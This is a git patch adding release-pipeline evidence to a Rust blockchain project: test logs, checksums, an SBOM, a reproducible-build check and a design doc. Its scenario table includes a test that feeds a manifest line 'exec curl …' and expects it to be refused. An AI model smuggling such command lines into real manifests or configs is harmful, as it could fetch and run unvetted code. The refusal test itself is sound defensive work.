+ test foreign_registry_line_refused ... ok
+ test missing_target_refused ... ok
+-test run_emits_make_test_commands ... ok
+ test registry_valid_passes ... ok
++test run_emits_make_test_commands ... ok
+ test shard_main_dead_refused ... ok
+-test vectors_file_has_exactly_10_unique_cases ... ok
+ test shard_set_mismatch_refused ... ok
++test vectors_file_has_exactly_10_unique_cases ... ok
+ test workflow_matrix_missing_shard_refused ... ok
+ 
+-test result: ok. 11 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.01s
++test result: ok. 11 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.00s
+ 
+    Compiling aura-testkit v0.1.0 (/home/user/AuraLite-Crypto/crates/aura-testkit)
+-    Finished `test` profile [unoptimized + debuginfo] target(s) in 2.36s
+-     Running tests/o0_ci.rs (target/debug/deps/o0_ci-a8378970ebbb818a)
++    Finished `test` profile [unoptimized + debuginfo] target(s) in 0.84s
++     Running tests/o0_ci.rs (target/debug/deps/o0_ci-0787d523f7ecf387)
+ exit=0
+diff --git a/docs/evidence/o1/README.md b/docs/evidence/o1/README.md
+new file mode 100644
+index 0000000..cfffe1a
+--- /dev/null
++++ b/docs/evidence/o1/README.md
+@@ -0,0 +1,20 @@
++# O1 evidence — Releases (10 scenarios)
++
++Gate (OPS_PLAN row O1): "two independent hosts -> identical binary sha256".
++Named control: repro_mismatch_refused. Two independent implementations (Python hashlib vs
++the std-only SHA-256 of `aura_testkit::release`); signatures are structurally
++checked here and verified by the wired `tools/sign_release.py verify`
++(H1 demo key).
++
++- `test.log`: `cargo test -p aura-testkit --test o1_release` (11 tests).
++- `nc.log`: `tools/nc_o1.py` mutation controls (6/6).
++- `sbom.log`: the deterministic SBOM regeneration.
++- `repro-check.log`: two independent builds of `aurad` with identical sha256.
++- `release-demo.log` / `release-check.log`: signed release assembly and the
++  release check (incl. the RFC 8032 verify step).
++- `inventory.txt`: case -> NC mapping and sha256 of fixture/generator/runner;
++  ends with `TOTAL: 680`.
++- `gates.txt` / `report.md` / `SHA256SUMS`: the receipts.
++
++Regenerate with `make evidence-o1`; every sha256 in `SHA256SUMS` can be
++recomputed with `sha256sum -c`.
+diff --git a/docs/evidence/o1/SHA256SUMS b/docs/evidence/o1/SHA256SUMS
+new file mode 100644
+index 0000000..66aa312
+--- /dev/null
++++ b/docs/evidence/o1/SHA256SUMS
+@@ -0,0 +1,16 @@
++ab8ad5067cefb2105d6267879359f9c274f3e6df446e6a650981de8f1003aa52  crates/aura-testkit/tests/fixtures/o1_release_vectors.json
++91e4caf13db3749ff4487cfd0dcd7218de54df73177791d9ff8b246c92c681c6  tools/gen_o1_vectors.py
++7621aeaa65b523694ef7894e34517053dcac5d5495454e8f718409e86a1d97b9  crates/aura-testkit/tests/o1_release.rs
++f0a1da837c73ca9476d40ca7acf84d3d0fe1bede9cff88cd52e69aa25a29006f  crates/aura-testkit/src/release.rs
++154d85e2b401f3f782fe1a28c984544be3ecfd8a5b5db5827125f4d514680919  docker/Dockerfile
++41fc9a5d515f1c0d430e9e57b3c70877e5236557a7264c46977260145f0c4520  tools/nc_o1.py
++c3b8827a6f4418d5084401313e1249fdcdba76f9ac0117237a2be815f33e87d5  tools/repro_check.py
++4006087fdc4bc180b12a7ab2487d6f16282a985b523162e1311f9b8e5ae024c5  docs/evidence/o1/test.log
++1a82d504b1044b9b9042a1ad04191ab98896bb44e5b397e6b8ee593e916bc730  docs/evidence/o1/nc.log
++7b6897ac117188d1489b122ab096bd130494695f27c7b423057ad674e404f767  docs/evidence/o1/sbom.log
++3b640b1a157d0064c7c09e26c24afbfe991a6d38d5e2cc1f4891bcb1c90303b5  docs/evidence/o1/repro-check.log
++ea42fe68116b8785076220402316641c842cff27bea4450d00c3a938a96dbb42  docs/evidence/o1/release-demo.log
++bceac73d53ee62eb00d61c02b1a2bb428c5ab9ebd7ab9cf14588eb22862bd17b  docs/evidence/o1/release-check.log
++8cc45c9ae7b34c96a787ac08166a9cbd300f9c19326b3458e0ef344495a5ac38  docs/evidence/o1/inventory.txt
++385da84a149aadc2491b467cd6ada6db3e03a108edb55b034da3df411feeef70  docs/evidence/o1/gates.txt
++fcb7a8abdfde81381906b40d5fa357f786b94a98112f0139685e9ffbcffa91de  docs/evidence/o1/report.md
+diff --git a/docs/evidence/o1/gates.txt b/docs/evidence/o1/gates.txt
+new file mode 100644
+index 0000000..5a7a051
+--- /dev/null
++++ b/docs/evidence/o1/gates.txt
+@@ -0,0 +1,6 @@
++# O1 gates
++release gate + 10 scenarios: PASS (11 tests: 10 scenarios + count guard)
++named control (repro_mismatch_refused): PASS
++mutation controls: PASS (6/6)
++two-host reproducibility: PASS (repro=ok, identical sha256)
++release check + signature verify: PASS
+diff --git a/docs/evidence/o1/inventory.txt b/docs/evidence/o1/inventory.txt
+new file mode 100644
+index 0000000..a5233f1
+--- /dev/null
++++ b/docs/evidence/o1/inventory.txt
+@@ -0,0 +1,21 @@
++# O1 inventory (generated by tools/write_o1_evidence.py)
++gate=O1 release pipeline: 10/10 cases pass; named negative control repro_mismatch_refused red on the dropped two-host equality check; 6/6 NC red under tools/nc_o1.py; two independent hosts -> identical binary sha256 (the O1 gate)
++vectors=10
++named_control=repro_mismatch_refused=present
++fixtures_sha256=ab8ad5067cefb2105d6267879359f9c274f3e6df446e6a650981de8f1003aa52
++generator_sha256=91e4caf13db3749ff4487cfd0dcd7218de54df73177791d9ff8b246c92c681c6
++runner_sha256=7621aeaa65b523694ef7894e34517053dcac5d5495454e8f718409e86a1d97b9
++release_module_sha256=f0a1da837c73ca9476d40ca7acf84d3d0fe1bede9cff88cd52e69aa25a29006f
++dockerfile_sha256=154d85e2b401f3f782fe1a28c984544be3ecfd8a5b5db5827125f4d514680919
++cases:
++  release_valid_passes exit=0 nc=-
++  sbom_regeneration_deterministic exit=0 nc=-
++  repro_mismatch_refused exit=65 nc=1
++  version_drift_refused exit=65 nc=2
++  changelog_missing_refused exit=65 nc=3
++  sbom_drift_refused exit=65 nc=-
++  checksum_mismatch_refused exit=65 nc=4
++  signature_malformed_refused exit=65 nc=5
++  docker_base_unpinned_refused exit=65 nc=-
++  foreign_manifest_line_refused exit=65 nc=6
++TOTAL: 680 negative controls cumulative
+diff --git a/docs/evidence/o1/nc.log b/docs/evidence/o1/nc.log
+new file mode 100644
+index 0000000..8e2e6ba
+--- /dev/null
++++ b/docs/evidence/o1/nc.log
+@@ -0,0 +1,9 @@
++$ /usr/local/bin/python3 tools/nc_o1.py
++PASS NC: repro-equality check dropped -> gate red (named: repro_mismatch_refused): repro_mismatch_refused
++PASS NC: version check dropped -> gate red: version_drift_refused
++PASS NC: changelog check dropped -> gate red: changelog_missing_refused
++PASS NC: checksum match check dropped -> gate red: checksum_mismatch_refused
++PASS NC: signature length check dropped -> gate red: signature_malformed_refused
++PASS NC: unknown-line strictness dropped -> gate red: foreign_manifest_line_refused
++RESULT: 6/6 negative controls PASS
++exit=0
+diff --git a/docs/evidence/o1/release-check.log b/docs/evidence/o1/release-check.log
+new file mode 100644
+index 0000000..79100de
+--- /dev/null
++++ b/docs/evidence/o1/release-check.log
+@@ -0,0 +1,7 @@
++$ make release-check
++make[1]: Entering directory '/home/user/AuraLite-Crypto'
++release=ok version=0.1.0 artifacts=1
++SIGNATURE OK: aurad
++signature verify (RFC 8032 demo key): ok
++make[1]: Leaving directory '/home/user/AuraLite-Crypto'
++exit=0
+diff --git a/docs/evidence/o1/release-demo.log b/docs/evidence/o1/release-demo.log
+new file mode 100644
+index 0000000..ddf422a
+--- /dev/null
++++ b/docs/evidence/o1/release-demo.log
+@@ -0,0 +1,6 @@
++$ make release-demo
++make[1]: Entering directory '/home/user/AuraLite-Crypto'
++signed aurad -> aurad.sig (pubkey 9fecbab6104c1483...)
++synced artifacts=1
++make[1]: Leaving directory '/home/user/AuraLite-Crypto'
++exit=0
+diff --git a/docs/evidence/o1/report.md b/docs/evidence/o1/report.md
+new file mode 100644
+index 0000000..c41b152
+--- /dev/null
++++ b/docs/evidence/o1/report.md
+@@ -0,0 +1,38 @@
++# O1 closeout report — Releases (the two-host reproducibility gate)
++
++Date: 2026-11-25. Gate (OPS_PLAN row O1): "two independent hosts ->
++identical binary sha256" — **satisfied** (`tools/repro_check.py` builds
++`aurad` twice into independent CARGO_TARGET_DIRs with SOURCE_DATE_EPOCH and
++`--remap-path-prefix`; the recorded digests are identical, see
++`repro-check.log`).
++
++- **The gate**: `repro_mismatch_refused` (the named control) feeds the checker a
++  `repro.txt` whose two host digests differ and expects `error: release:
++  repro mismatch: aura-bin` (exit 65); mutation NC-1 (`tools/nc_o1.py`)
++  drops the two-host equality check and the case must turn red.
++- **Scenarios**: 10 deterministic cases from the independent oracle
++  `tools/gen_o1_vectors.py` (Python hashlib sha256), asserted byte-for-byte
++  by `tests/o1_release.rs` (11/11 with the count guard) against
++  `aura_testkit::release` (std-only SHA-256).
++- **Mutation controls**: 6/6 PASS (repro-equality check [named], version
++  check, changelog check, checksum match check, signature length check,
++  unknown-line strictness).
++- **Device model** (docs/o1-releases-plan.md): D-O1-1 the reproducible
++  release build and its two-host record; D-O1-2 the checked release
++  manifest `release/manifest.txt` (strict parse, semver/CHANGELOG binding,
++  SHA256SUMS digests, signature structure, SBOM regeneration, repro
++  record, Dockerfile policy); D-O1-3 signature binding is structural —
++  the RFC 8032 verification is the wired `tools/sign_release.py verify`
++  step (H1 demo key; production keys are offline/air-gapped); D-O1-4 the
++  deterministic SBOM, digest-pinned multi-stage `docker/Dockerfile`;
++  D-O1-5 two independent implementations (Python hashlib vs the std-only
++  SHA-256).
++- **Correction note**: `docs/evidence/o0/` was regenerated with this
++  bundle after fixing the named-control string check in
++  `tools/write_o0_evidence.py` (it still matched the pre-redesign `shard
++  07` text and reported a false `FAIL`); the O0 gate verdicts are
++  unchanged (11/11 tests, 6/6 NC).
++
++Receipts: `gates.txt`, `test.log`, `nc.log`, `sbom.log`,
++`repro-check.log`, `release-demo.log`, `release-check.log`,
++`inventory.txt`, `SHA256SUMS`. Regenerate with `make evidence-o1`.
+diff --git a/docs/evidence/o1/repro-check.log b/docs/evidence/o1/repro-check.log
+new file mode 100644
+index 0000000..bad9b36
+--- /dev/null
++++ b/docs/evidence/o1/repro-check.log
+@@ -0,0 +1,3 @@
++$ /usr/local/bin/python3 tools/repro_check.py
++repro=ok sha256=dc32c4d12c784963f2456f747c6e91c0fbbcfc9eae1e3ee52c4d1ae4fdb85e21 binary=aurad hosts=2 source_date_epoch=1795620364
++exit=0
+diff --git a/docs/evidence/o1/sbom.log b/docs/evidence/o1/sbom.log
+new file mode 100644
+index 0000000..e86d29f
+--- /dev/null
++++ b/docs/evidence/o1/sbom.log
+@@ -0,0 +1,23 @@
++$ cargo run -q -p aura-testkit --bin aura-release -- sbom --workspace . --release release
++sbom v1
++pkg name=aura-bench version=0.1.0 license=MIT OR Apache-2.0 deps=aura-codec.workspace,aura-crypto.workspace,aura-state.workspace
++pkg name=aura-block version=0.1.0 license=MIT OR Apache-2.0 deps=aura-codec.workspace,aura-crypto.workspace,aura-tx.workspace,aura-types.workspace
++pkg name=aura-codec version=0.1.0 license=MIT OR Apache-2.0 deps=aura-types.workspace
++pkg name=aura-consensus version=0.1.0 license=MIT OR Apache-2.0 deps=aura-block.workspace,aura-crypto.workspace,aura-p2p.workspace,aura-tx.workspace,aura-types.workspace,blst.workspace
++pkg name=aura-crypto version=0.1.0 license=MIT OR Apache-2.0 deps=aura-types.workspace,blake3.workspace,ed25519-dalek.workspace,k256.workspace,subtle.workspace,zeroize.workspace
++pkg name=aura-exec version=0.1.0 license=MIT OR Apache-2.0 deps=aura-crypto,aura-state,aura-types,wasmi,wasmtime
++pkg name=aura-genesis version=0.1.0 license=MIT OR Apache-2.0 deps=aura-block.workspace,aura-codec.workspace,aura-crypto.workspace,aura-state.workspace,aura-tx.workspace,aura-types.workspace,serde_json.workspace,toml.workspace
++pkg name=aura-grpc-rest version=0.1.0 license=MIT OR Apache-2.0 deps=aura-rpc.workspace,prost.workspace,serde_json.workspace,tokio-stream.workspace,tokio.workspace,tonic-prost.workspace,tonic.workspace
++pkg name=aura-mempool version=0.1.0 license=MIT OR Apache-2.0 deps=aura-tx,aura-types
++pkg name=aura-node version=0.1.0 license=MIT OR Apache-2.0 deps=aura-block.workspace,aura-codec.workspace,aura-consensus.workspace,aura-crypto.workspace,aura-genesis.workspace,aura-grpc-rest.workspace,aura-mempool.workspace,aura-p2p.workspace,aura-rpc.workspace,aura-state.workspace,aura-storage.workspace,aura-tx.workspace,aura-types.workspace,opentelemetry-otlp.workspace,opentelemetry.workspace,opentelemetry_sdk.workspace,serde_json.workspace,signal-hook.workspace,tokio.workspace,toml.workspace,tracing-opentelemetry.workspace,tracing-subscriber.workspace,tracing.workspace
++pkg name=aura-p2p version=0.1.0 license=MIT OR Apache-2.0 deps=aes,aes-gcm,aura-codec.workspace,aura-crypto.workspace,aura-state.workspace,aura-types.workspace,hkdf,sha2,x25519-dalek,zeroize
++pkg name=aura-rpc version=0.1.0 license=MIT OR Apache-2.0 deps=base64.workspace,serde_json.workspace,sha1.workspace
++pkg name=aura-sdk version=0.1.0 license=MIT OR Apache-2.0 deps=aura-sdk-macros
++pkg name=aura-sdk-macros version=0.1.0 license=MIT OR Apache-2.0 deps=proc-macro2,quote,syn
++pkg name=aura-state version=0.1.0 license=MIT OR Apache-2.0 deps=aura-codec.workspace,aura-crypto.workspace,aura-types.workspace,sha2.workspace
++pkg name=aura-storage version=0.1.0 license=MIT OR Apache-2.0 deps=aura-codec.workspace,aura-crypto.workspace,aura-state.workspace,aura-types.workspace,rocksdb
++pkg name=aura-testkit version=0.1.0 license=MIT OR Apache-2.0 deps=aura-block.workspace,aura-codec.workspace,aura-crypto.workspace,aura-genesis.workspace,aura-state.workspace,aura-tx.workspace,aura-types.workspace
++pkg name=aura-tx version=0.1.0 license=MIT OR Apache-2.0 deps=aura-codec.workspace,aura-crypto.workspace,aura-types.workspace
++pkg name=aura-types version=0.1.0 license=MIT OR Apache-2.0 deps=
++pkg name=aura-wallet version=0.1.0 license=MIT OR Apache-2.0 deps=aes,aes-gcm,argon2,aura-codec,aura-consensus,aura-crypto,aura-rpc,aura-tx,aura-types,bip32,bip39,hex,hmac,k256,rand_core,scrypt-w1-wipe,serde_json,sha2,unicode-normalization,unicode-normalization-15-1,zeroize
++exit=0
+diff --git a/docs/evidence/o1/test.log b/docs/evidence/o1/test.log
+new file mode 100644
+index 0000000..ca44c7a
+--- /dev/null
++++ b/docs/evidence/o1/test.log
+@@ -0,0 +1,21 @@
++$ cargo test -p aura-testkit --test o1_release
++
++running 11 tests
++test changelog_missing_refused ... ok
++test checksum_mismatch_refused ... ok
++test docker_base_unpinned_refused ... ok
++test foreign_manifest_line_refused ... ok
++test release_valid_passes ... ok
++test repro_mismatch_refused ... ok
++test sbom_drift_refused ... ok
++test sbom_regeneration_deterministic ... ok
++test vectors_file_has_exactly_10_unique_cases ... ok
++test signature_malformed_refused ... ok
++test version_drift_refused ... ok
++
++test result: ok. 11 passed; 0 failed; 0 ignored; 0 measured; 0 filtered out; finished in 0.01s
++
++   Compiling aura-testkit v0.1.0 (/home/user/AuraLite-Crypto/crates/aura-testkit)
++    Finished `test` profile [unoptimized + debuginfo] target(s) in 1.95s
++     Running tests/o1_release.rs (target/debug/deps/o1_release-4f62034dd1a44f56)
++exit=0
+diff --git a/docs/evidence/review-w1-source-drift.txt b/docs/evidence/review-w1-source-drift.txt
+index aa30913..bf54af4 100644
+--- a/docs/evidence/review-w1-source-drift.txt
++++ b/docs/evidence/review-w1-source-drift.txt
+@@ -1,11 +1,11 @@
+-adc24e7c03e1a63e5d7addbda15ff40ce630367152699c5d9659cd8db65f357b 18b1683ee713c0feeb52c0e5f3ec7395f3d840b3fb7cbd9f72da71ba8ad8e873 CHANGELOG.md
+-c83d08301a703c9db11462aa541bc898e52548589972118465164895eed44dc7 18b1683ee713c0feeb52c0e5f3ec7395f3d840b3fb7cbd9f72da71ba8ad8e873 CHANGELOG.md
++adc24e7c03e1a63e5d7addbda15ff40ce630367152699c5d9659cd8db65f357b 92d499f7e68f3488e25d4517045e7b1a953c9d4fdc2f0b4a2fbe77477a15640a CHANGELOG.md
++c83d08301a703c9db11462aa541bc898e52548589972118465164895eed44dc7 92d499f7e68f3488e25d4517045e7b1a953c9d4fdc2f0b4a2fbe77477a15640a CHANGELOG.md
+ c9680cc436d806fa7fa2ce8545bd148dc9fcc9ae444973d4968a3f4f4fc069dc 1dda202ae4c195f0a0712254f05a133ffe93205f79101ea0732b6504bbb7d308 Cargo.lock
+ f0d3511cd02f3007c0a18fc5d94c8997cfa512449313776117265708a36c8553 1dda202ae4c195f0a0712254f05a133ffe93205f79101ea0732b6504bbb7d308 Cargo.lock
+ 23185f790bc4697bbd163004e2c78873755c13efba05b46260b4827cdeabdff7 2daf6ad4e47b14511cc7995525346d5a70079a563554fcf95226ed188535ea12 Cargo.toml
+ d5518138eae73219f8da0d7297af44a471dbd7135a39587a0da1587bfe3d1e70 2daf6ad4e47b14511cc7995525346d5a70079a563554fcf95226ed188535ea12 Cargo.toml
+-5fb6ce43826495321f697e138e71e87954b2fcabec1ceef70549bb49a2f38988 05ed893f24e631cd7995667fde445659d794ea643915f5cbc9ee085d2d2ce713 Makefile
+-c5e92007c53a22253ad7d2cc779863b9592562a394d1b26ff09ea8d031991e29 05ed893f24e631cd7995667fde445659d794ea643915f5cbc9ee085d2d2ce713 Makefile
++5fb6ce43826495321f697e138e71e87954b2fcabec1ceef70549bb49a2f38988 777906e7ec78fbfa75b693233c6941173c1ea041e00b3a14f0b88242c0e92ce4 Makefile
++c5e92007c53a22253ad7d2cc779863b9592562a394d1b26ff09ea8d031991e29 777906e7ec78fbfa75b693233c6941173c1ea041e00b3a14f0b88242c0e92ce4 Makefile
+ bcc7328bd9c464a857c4b97c8491277bf401299d3c7963f1925b075d4313feb6 f2e4a249573a5b902b3f566b3f1db1ebab12d994f1ab6ef9be2dc15df63d7e26 crates/aura-consensus/src/fork_choice.rs
+ 7e396fbb4fd1d4103f26db16796ab0b6ad9626b7ba2ea0d56cae379bde5c2d59 8ec730ce2dc2cb1bc266990f4f29133038e98e390a63be0edbb3eaa23fa48f23 crates/aura-consensus/src/governance.rs
+ bd58be73dc4e0f6da16735be1d5ed17306d16c08569d798a4af20fcf72b91d40 b2e8ddad5b281da54e9c68107b563c9125b3931fe0e8e26023c74dcf3011ccc3 crates/aura-consensus/src/slashing.rs
+@@ -46,8 +46,8 @@ c477f915b427982ca83fcb253fa0ab850d619ca5bf4a764137f0407078af4986 26a28bcc51e2cab
+ b4897ba4dbc33f098c27e415669e2e0bbca45933694b67aa590181041ebfdf0f e7b3e704bb1c5688159f38f66f31ba17893bad818c8876e097631ab2725abf5b fuzz/Cargo.toml
+ dca80316562fefcf24c45b40fb635412e1d4e5e09b5abe26f7d0e6b67e1e906e 53ac68024a82d40e64badd40ead1ebea5e0af8be1e56d4184a0eb0f22eab55a2 fuzz/README.md
+ 6e80f8eab5695501a3350e70bd086675cf4d1669cf370d92e98702d18c7bfe6e 7414f1e69a9690bdf93c79dc0ca32ec5cac7ca3b4f0df2d317e39c6fa95abc99 fuzz/src/lib.rs
+-1259c6bbc3bd3d53cbe0dd1d69d8d762336dc26287215d2ee35307bba90ea85c c6070e5aca3a2bf6bb7cab68689cd59106a00ab4df6278316d93dff8b5e66635 tools/audit_closeout.py
+-7bd672503f104aa733dff03e84f57ac26ef926607657ab6a799f9d2bc14c0dc9 c6070e5aca3a2bf6bb7cab68689cd59106a00ab4df6278316d93dff8b5e66635 tools/audit_closeout.py
++1259c6bbc3bd3d53cbe0dd1d69d8d762336dc26287215d2ee35307bba90ea85c be9414bfedd0f0157e2539f7ae0a031de24a36e8c15842e3482b8d95542dbd87 tools/audit_closeout.py
++7bd672503f104aa733dff03e84f57ac26ef926607657ab6a799f9d2bc14c0dc9 be9414bfedd0f0157e2539f7ae0a031de24a36e8c15842e3482b8d95542dbd87 tools/audit_closeout.py
+ 4d7d73580e09a49f1a0a9faf668254b0ec12f891efa527db863fa3abf8cce4a1 ab356092fc59ed98bff8d3622ef74e35eb33da5f342c5b6dccf5d73aeb20763b tools/gen_w0_vectors.py
+ 303fc648659cc72d9f8cf7cf6bc71ed8c9bd5a9f9a8d923d5a1e78bcffba0b5b 5e62e17226bfc601e8775b54e7f6a025d36c1357b7206d33c18c442cb49746eb tools/nc_b10.py
+ f86dee929549c751519e1749e0976c561e47a174a129412caf8cd23680887f61 3ae536e2637862525ca6edb1eeaa927a018a529856402d60c7260e92481d0b19 tools/nc_b5.py
+diff --git a/docs/o1-releases-plan.md b/docs/o1-releases-plan.md
+new file mode 100644
+index 0000000..93aa6d7
+--- /dev/null
++++ b/docs/o1-releases-plan.md
+@@ -0,0 +1,105 @@
++# O1 — Releases: reproducible build, signed artifacts, SBOM (design)
++
++**Gate (OPS_PLAN):** two independent hosts → identical binary sha256.
++**DoD:** reproducible build, Docker multi-stage, signatures, SBOM,
++CHANGELOG, semver. **Named scenario: `repro_mismatch_refused`.**
++
++The release process is a checked pipeline, not folklore: `aura-release`
++validates a release directory (manifest, digests, signatures, SBOM, the
++two-host reproducibility record, Dockerfile policy) against the workspace,
++and every claim has a test and a negative control. The crypto verify of
++signatures is the existing H1 tool (`tools/sign_release.py`, demo key);
++the structural checks below are the fixture surface.
++
++## Decisions
++
++- **D-O1-1 (reproducible release build).** `make repro-check`
++  (`tools/repro_check.py`) builds the release binary (`aurad`) twice into
++  two independent `CARGO_TARGET_DIR`s — the "two hosts" of the gate — with
++  `SOURCE_DATE_EPOCH` pinned to the commit date and
++  `RUSTFLAGS=--remap-path-prefix`, and refuses unless the two sha256
++  digests are identical. The digests are recorded in `repro.txt` (the
++  release record: `repro v1` / `binary <name>` / `toolchain` /
++  `source_date_epoch` / `host <id> sha256 <hex>` ×2); a release whose
++  record shows differing host digests is `error: release: repro mismatch:
++  <binary>` (exit 65) — the named control `repro_mismatch_refused`.
++- **D-O1-2 (the release manifest is a checked registry).**
++  `release/manifest.txt` (strict text, stdlib-parsable): `rule release-v1`,
++  `version <semver>`, `keyid <hex-64>`, `artifact <name>`, `sig
++  <artifact> <sigfile>`. `aura-release check` validates, in order: strict
++  parse (`unknown manifest line`), semver + workspace version match
++  (`version drift`), CHANGELOG entry `## [<version>` (`changelog entry
++  missing`), artifact presence (`artifact missing`), SHA256SUMS digests
++  (`checksum mismatch`/`checksum stale`), signature structure
++  (`signature missing`/`signature malformed` — exactly 64 decoded bytes —
++  / `key mismatch`), SBOM regeneration (`sbom drift`), the repro record
++  (`repro mismatch`), and the Dockerfile policy (`docker single stage` /
++  `docker base unpinned`). `aura-release sync` regenerates
++  `manifest.txt`/`SHA256SUMS`/`SBOM.txt` from the release directory.
++- **D-O1-3 (signatures: structural check + wired RFC 8032 verify).**
++  The fixture surface checks the binding layer: every artifact carries a
++  detached `.sig` (base64, exactly 64 bytes = ed25519) and the manifest
++  `keyid` equals the pinned `docs/release-pubkey.txt`. The real
++  verification (`tools/sign_release.py verify`, H1 demo key — production
++  keys are generated offline on air-gapped media, D-H1-5) runs as a wired
++  make step inside `make release-check`. Never claim structural checks are
++  cryptographic verification.
++- **D-O1-4 (SBOM + Docker + CHANGELOG + semver).** `make sbom` writes a
++  deterministic `release/SBOM.txt` (`sbom v1` + `pkg name=… version=…
++  license=… deps=…`) from the workspace manifests (name, workspace
++  version/license, dependency keys). `docker/Dockerfile` is multi-stage
++  with digest-pinned bases (refused: `docker base unpinned`). The workspace
++  version comes from `[workspace.package]`; every crate must stay on
++  `version.workspace = true` (semver single-source). CHANGELOG must carry
++  the release entry `## [<version>`.
++- **D-O1-5 (two implementations).** `tools/gen_o1_vectors.py` computes the
++  expected verdicts and the SHA-256 digests independently (Python
++  `hashlib`); `crates/aura-testkit/src/release.rs` embeds a std-only
++  SHA-256 and must match the fixture byte-for-byte
++  (`tests/o1_release.rs` + `tests/fixtures/o1_release_vectors.json`).
++
++## Test scenarios (10, fixture `o1_release_vectors.json`)
++
++| # | name | scenario | exit |
++|---|---|---|---|
++| 1 | release_valid_passes | the whole valid release checks out (check + regenerated SHA256SUMS) | 0 `release=ok version=0.1.0 artifacts=2` |
++| 2 | sbom_regeneration_deterministic | `sbom` prints the pinned SBOM (byte-for-byte) | 0 |
++| 3 | **repro_mismatch_refused (NAMED)** | two host digests differ -> `repro mismatch: aura-bin` | 65 |
++| 4 | version_drift_refused | manifest version != workspace version -> `version drift: …` | 65 |
++| 5 | changelog_missing_refused | no `## [<version>` entry -> `changelog entry missing: …` | 65 |
++| 6 | sbom_drift_refused | SBOM edited -> `sbom drift` | 65 |
++| 7 | checksum_mismatch_refused | SHA256SUMS hex wrong -> `checksum mismatch: …` | 65 |
++| 8 | signature_malformed_refused | `.sig` not 64 bytes -> `signature malformed: …` | 65 |
++| 9 | docker_base_unpinned_refused | `FROM node:latest` -> `docker base unpinned: …` | 65 |
++| 10 | foreign_manifest_line_refused | `exec curl …` line -> `unknown manifest line: …` | 65 |
++
++## Negative controls (`tools/nc_o1.py`, 6)
++
++| NC | mutation in `release.rs` | must turn red |
++|---|---|---|
++| 1 | repro-equality check dropped | `repro_mismatch_refused` (**named**) |
++| 2 | version check dropped | `version_drift_refused` |
++| 3 | changelog check dropped | `changelog_missing_refused` |
++| 4 | checksum match check dropped | `checksum_mismatch_refused` |
++| 5 | signature length check dropped | `signature_malformed_refused` |
++| 6 | unknown-line strictness dropped | `foreign_manifest_line_refused` |
++
++## Make targets / CI
++
++- `make sbom` — regenerate `release/SBOM.txt` (deterministic).
++- `make repro-check` — the named gate: two independent release builds of
++  `aurad`, identical sha256 or red (`tools/repro_check.py`).
++- `make release-sync` — regenerate `release/manifest.txt` + `SHA256SUMS`.
++- `make release-check` — `aura-release check` + `tools/sign_release.py
++  verify` over the release artifacts (the wired RFC 8032 step).
++- `make {gen-o1-vectors,test-o1,nc-o1,evidence-o1}` — the phase loop.
++- Workflow: the O0 `registry` job keeps running `make test` gates; the O1
++  release checks run inside `make test` (manifest/sbom/docker policy) and
++  `make repro-check` is the explicit release gate.
++
++## Evidence (`docs/evidence/o1/`)
++
++- `test.log`, `nc.log`, `inventory.log` (`TOTAL: 680`),
++  `repro-check.log` (two digests + `repro=ok sha256=…`),
++  `release-check.log` (`release=ok …` + signature verify),
++  `report.md`, `gates.txt`, `SHA256SUMS`, `README.md`.
+diff --git a/docs/plans/OPS_PLAN.md b/docs/plans/OPS_PLAN.md
+index dbb943e..a0a3eb6 100644
+--- a/docs/plans/OPS_PLAN.md
++++ b/docs/plans/OPS_PLAN.md
+@@ -26,7 +26,7 @@ a loud name.
+ | Phase | Title | DoD | Test gate |
+ |---|---|---|---|
+ | ✅ **O0** | CI baseline | GitHub Actions, 10 shards, cache, `make test`, coverage report | NC: disable a shard → CI red (target registry check) |
+-| **O1** | Releases | reproducible build, Docker multi-stage, signatures, SBOM, CHANGELOG, semver | two independent hosts → identical binary sha256 |
++| ✅ **O1** | Releases | reproducible build, Docker multi-stage, signatures, SBOM, CHANGELOG, semver | two independent hosts → identical binary sha256 |
+ | **O2** | M0/M1 gates | 4-validator devnet, "how to run" docs, first receipts | ROADMAP §5 M0 and M1 criteria met |
+ | **O3** | Closed testnet | invited operators, monitoring, on-call, backup/restore drills | 7 days uptime, 0 state losses, 1 restore drill |
+ | **O4** | Public testnet (M2) | faucet, explorer, docs, bug bounty, public metrics, >= 10 external validators | 30 days, >= 99% uptime, >= 100 000 txs, 0 unfixed criticals |
+@@ -62,14 +62,51 @@ a loud name.
+   disabled/missing/duplicate/empty/shard-set/main-dead/foreign-line/workflow
+   refusals.
+ - Mutation controls (`tools/nc_o0.py`, 6): disabled-shard check, missing
+-  target check, duplicate check, shard-count check, empty-shard check,
++  target check, duplicate check, shard-set check, empty-shard check,
+   unknown-line strictness — 6/6 PASS.
+ - Workflow `.github/workflows/ci.yml`: `registry` job (`make ci-check`), a
+-  10-way `test` matrix (`make ci-shard SHARD=k`), a `coverage` job
+-  (`make coverage` -> `docs/coverage.txt`), cargo cache keyed on
+-  `Cargo.lock`. Every step is a make target — `make test` remains the one
+-  local command (D-O1, no secret shards: the registry format cannot carry
+-  commands).
++  10-way `test` matrix over the lanes of CONTRIBUTING.md (`make ci-shard
++  SHARD=<lane>`), a `coverage` job (`make coverage` ->
++  `docs/coverage.txt`), cargo cache keyed on `Cargo.lock`. Every step is a
++  make target — `make test` remains the one local command (D-O1, no secret
++  shards: the registry format cannot carry commands).
++
++### O1 receipt (2026-11-25)
++
++- Deliverable: `patches/0104-O1-releases.patch` (complete O1-from-O0 phase
++  patch).
++- The gate "two independent hosts -> identical binary sha256" is measured,
++  not asserted (D-O1-1): `make repro-check` (`tools/repro_check.py`) builds
++  the release binary `aurad` twice into two independent `CARGO_TARGET_DIR`s
++  with `SOURCE_DATE_EPOCH` pinned to the commit date and
++  `--remap-path-prefix` hygiene, and records the identical digests in
++  `release/repro.txt`. Named control: `repro_mismatch_refused` — a record
++  whose two host digests differ is `error: release: repro mismatch:
++  aura-bin` (exit 65); mutation NC-1 drops the equality check and the case
++  must turn red. "Two hosts disagree -> CI red" — the O1 gate.
++- The release process is a checked pipeline (D-O1-2):
++  `aura_testkit::release` validates the strict `release/manifest.txt`
++  against the workspace — semver/`version drift`, the `## [0.1.0` CHANGELOG
++  entry, artifact presence, SHA256SUMS digests, the 64-byte detached
++  ed25519 signature structure and pinned keyid (D-O1-3; the RFC 8032
++  verification is the wired `tools/sign_release.py verify` step, H1 demo
++  key), the deterministic SBOM regeneration (D-O1-4), the two-host repro
++  record, and the Dockerfile policy (multi-stage, digest-pinned bases).
